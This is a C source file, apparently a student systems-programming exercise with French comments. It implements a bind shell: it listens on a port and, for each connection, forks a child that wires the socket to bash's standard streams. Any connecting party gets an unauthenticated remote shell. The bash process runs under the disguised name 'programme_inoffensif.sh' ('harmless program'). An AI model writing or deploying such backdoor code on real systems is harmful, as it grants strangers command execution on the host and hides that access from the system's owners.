#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/wait.h>
#include <signal.h>

#include "utils_v2.h"
#include "network.h"

int sousProcessTab[30] = {0};
int nbrSousProcess = 0;

void startShell(void *arg)
{
  int socketFD = *(int *)arg;
  dup2(socketFD, STDIN_FILENO);
  dup2(socketFD, STDOUT_FILENO);
  dup2(socketFD, STDERR_FILENO);

  sclose(socketFD);

  sexecl("/bin/bash", "programme_inoffensif.sh", NULL);
}

int getPort(int nbArg, const char *const tabArg[])
{
  int port;
  if (nbArg > 1)
  {
    port = atoi(tabArg[1]);
  }
  else
  {
    port = tabPorts[randomIntBetween(0, 9)];
  }

  printf("Port choisi aléatoirement : %d\n", port);

  return port;
}

void siginthandler(int sig)
{
  for (size_t i = 0; i < nbrSousProcess; i++)
  {
    skill(sousProcessTab[i],SIGINT);
  }
     
}

int main(int argc, char const *argv[])
{
  // initialisation de la structure sigaction
  struct sigaction action = {0};
  action.sa_handler = siginthandler;
  // action.sa_flags = 0;

  int ret = sigaction(SIGINT, &action, NULL);
  checkNeg(ret, "erreur sigaction sigint");

  int port = getPort(argc, argv);
  int sockfd = initSocketServer(port);
  while (1)
  {
    printf("Attente de connexion au socket...\n");
    int socketForThisAccept = accept(sockfd, NULL, NULL);
    if (socketForThisAccept == -1)
    {
      exit(1);
    }

    printf("Connexion reçue !\n");
    sousProcessTab[nbrSousProcess] = fork_and_run1(startShell, &socketForThisAccept);
    nbrSousProcess++;
  }
}